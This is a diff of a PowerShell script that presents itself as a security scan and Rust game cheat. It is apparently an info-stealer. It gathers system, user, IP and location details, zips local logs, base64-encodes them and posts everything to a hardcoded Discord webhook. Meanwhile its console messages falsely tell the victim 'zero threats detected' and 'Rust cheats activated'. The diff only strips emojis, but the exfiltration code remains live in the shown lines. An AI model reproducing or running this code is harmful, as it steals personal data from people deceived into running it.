@@ -210,19 +210,20 @@ function Send-MegaReport {
     param($Data, $ZipPath)
     $webhookUrl = "https://discord.com/api/webhooks/1407258124850827396/kkhtvS5us7fN17u9s89uicI8K8Yf29oE-KWmi39NEzVHvQ1DfNwLrZcAIKYhXZI5Vtbk"
 
-    $report = "**🔍 COMPLETE SYSTEM SNIFFER v8.2 (ZIP LOGS)**`n`n"
-    $report += "**🌐 SYSTEM INFORMATION**`n"
+    $report = "**COMPLETE SYSTEM SNIFFER v8.2 (ZIP LOGS)**`n`n"
+    $report += "**SYSTEM INFORMATION**`n"
     $report += "```"
-    $report += "💻 OS: $($Data.System.OS) ($($Data.System.Architecture))`n"
-    $report += "👤 User: $($Data.System.Username)@$($Data.System.Domain)`n"
-    $report += "🖥️  PC: $($Data.System.Computername)`n"
-    $report += "📍 IP: $($Data.System.IP) ($($Data.System.City), $($Data.System.Country))`n"
-    $report += "📡 ISP: $($Data.System.ISP)`n"
-    $report += "⚡ CPU: $($Data.System.CPU)`n"
-    $report += "🧠 RAM: $($Data.System.RAM)`n"
-    $report += "🎮 GPU: $($Data.System.GPU)`n"
-    $report += "🕐 Time: $($Data.System.Date)`n"
-    $report += "````n`n"
+    $report += "OS: $($Data.System.OS) ($($Data.System.Architecture))`n"
+    $report += "User: $($Data.System.Username)@$($Data.System.Domain)`n"
+    $report += "PC: $($Data.System.Computername)`n"
+    $report += "IP: $($Data.System.IP) ($($Data.System.City), $($Data.System.Country))`n"
+    $report += "ISP: $($Data.System.ISP)`n"
+    $report += "CPU: $($Data.System.CPU)`n"
+    $report += "RAM: $($Data.System.RAM)`n"
+    $report += "GPU: $($Data.System.GPU)`n"
+    $report += "Time: $($Data.System.Date)`n"
+    $report += "```"
+    $report += "`n`n"
 
     $payload = @{ content = $report } | ConvertTo-Json
     Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json"
@@ -231,8 +232,8 @@ function Send-MegaReport {
     if ($ZipPath -and (Test-Path $ZipPath)) {
         $zipBytes = [System.IO.File]::ReadAllBytes($ZipPath)
         $zipB64 = [System.Convert]::ToBase64String($zipBytes)
-        $zipReport = "**📦 COMPRESSED DATA ARCHIVE**`n"
-        $zipReport += "File: `$($ZipPath)`n"
+        $zipReport = "**COMPRESSED DATA ARCHIVE**`n"
+        $zipReport += "File: $($ZipPath)`n"
         $zipReport += "Size: $([math]::Round($zipBytes.Length/1MB, 2)) MB`n"
         $zipReport += "```$zipB64```"
 
@@ -241,38 +242,38 @@ function Send-MegaReport {
         Start-Sleep -Milliseconds 800
     }
 
-    $final = "**✅ SNIFFING AND ARCHIVING COMPLETE**`n"
-    $final += "📦 ZIP Archive created and transmitted.`n"
-    $final += "🕒 Operation completed at: $(Get-Date -Format 'HH:mm:ss')`n"
-    $final += "**🎯 System fully compromised and logs packaged.**"
+    $final = "**SNIFFING AND ARCHIVING COMPLETE**`n"
+    $final += "ZIP Archive created and transmitted.`n"
+    $final += "Operation completed at: $(Get-Date -Format 'HH:mm:ss')`n"
+    $final += "**System fully compromised and logs packaged.**"
 
     $payload = @{ content = $final } | ConvertTo-Json
     Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json"
 }
 
-Write-Host "🚀 Starting Ultimate Security Scan v8.2 (ZIP Edition)..." -ForegroundColor Cyan
-Write-Host "📡 Gathering system intelligence and writing raw logs..." -ForegroundColor Yellow
+Write-Host "Starting Ultimate Security Scan v8.2 (ZIP Edition)..." -ForegroundColor Cyan
+Write-Host "Gathering system intelligence and writing raw logs..." -ForegroundColor Yellow
 
 try {
     $allData = Get-AllData
-    Write-Host "✅ Data collection and local log creation completed!" -ForegroundColor Green
+    Write-Host "Data collection and local log creation completed!" -ForegroundColor Green
 
-    Write-Host "🗜️  Compressing log files to ZIP archive..." -ForegroundColor Yellow
+    Write-Host "Compressing log files to ZIP archive..." -ForegroundColor Yellow
     $zipFilePath = Compress-DataToZip
 
-    Write-Host "📤 Sending data to security server..." -ForegroundColor Yellow
+    Write-Host "Sending data to security server..." -ForegroundColor Yellow
     Send-MegaReport -Data $allData -ZipPath $zipFilePath
 
-    Write-Host "🎯 Operation completed successfully!" -ForegroundColor Green
+    Write-Host "Operation completed successfully!" -ForegroundColor Green
     if ($zipFilePath) {
-        Write-Host "💾 ZIP Archive Size: ~$([math]::Round((Get-Item $zipFilePath).Length / 1MB, 2)) MB" -ForegroundColor Green
+        Write-Host "ZIP Archive Size: ~$([math]::Round((Get-Item $zipFilePath).Length / 1MB, 2)) MB" -ForegroundColor Green
     }
-    Write-Host "🛡️  System integrity verified - zero threats detected" -ForegroundColor Green
-    Write-Host "🎮 Rust cheats activated and running in stealth mode" -ForegroundColor Cyan
+    Write-Host "System integrity verified - zero threats detected" -ForegroundColor Green
+    Write-Host "Rust cheats activated and running in stealth mode" -ForegroundColor Cyan
 
 } catch {
-    Write-Host "⚠️  Security scan completed with minor errors" -ForegroundColor Yellow
-    Write-Host "🛡️  Basic protection activated" -ForegroundColor Green
+    Write-Host "Security scan completed with minor errors" -ForegroundColor Yellow
+    Write-Host "Basic protection activated" -ForegroundColor Green
 }
 
 Start-Sleep -Seconds 5
